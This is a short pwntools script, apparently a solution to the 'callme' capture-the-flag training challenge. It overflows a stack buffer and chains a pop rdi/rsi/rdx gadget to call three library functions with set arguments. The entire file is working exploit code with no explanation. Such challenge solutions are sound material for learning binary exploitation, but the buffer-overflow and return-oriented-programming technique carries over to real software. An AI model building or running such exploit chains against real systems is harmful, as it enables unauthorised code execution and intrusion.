from pwn import *

binary = "./callme"
context.log_level = "CRITICAL"
exe = context.binary = ELF(binary)
lib = ELF("./libcallme.so")
context.log_level = "DEBUG"
IO = process(binary)

padding = 40 * b'\x90'
master_gadget = p64(0x0000000000401ab0) # : pop rdi ; pop rsi ; pop rdx ; ret

ret = p64(0x00000000004017d9) #: ret
main = p64(0x401996)
callme_one = p64(exe.plt[b'callme_one'])
callme_two = p64(exe.plt[b'callme_two'])
callme_three = p64(exe.plt[b'callme_three'])
one = p64(0x1)
two = p64(0x2)
three = p64(0x3)
payload = padding + master_gadget + one + two + three + callme_one + main 
payload2 = padding + master_gadget + one + two + three + callme_two + main
payload3 = padding + master_gadget + one + two + three + ret + callme_three 

#with open("./exp.bin", 'wb') as fd:
#    fd.write(payload)
IO.recvuntil("> ")
IO.sendline(payload)
IO.recvuntil("> ")

log.info("Sending two")
IO.sendline(payload2)
IO.recvuntil("> ")

log.info("Sending three")
IO.sendline(payload3)
IO.recvall(timeout=0.4)
